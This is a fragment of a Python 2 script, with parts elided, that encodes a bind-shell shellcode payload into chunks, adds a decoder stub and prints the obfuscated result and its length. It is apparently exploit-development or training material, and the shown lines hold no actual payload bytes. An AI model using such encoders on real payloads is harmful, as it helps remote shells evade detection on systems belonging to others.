...
shellcode = bindshell.decode('hex')
print "Original Shellcode Length: %s" % len(shellcode)
encoded = []
chunk_no = 0
...
print 'shellcode = "%s"' % final_shellcode
print "Shellcode length: %s" % (len(decoder_stub)+len(encoded))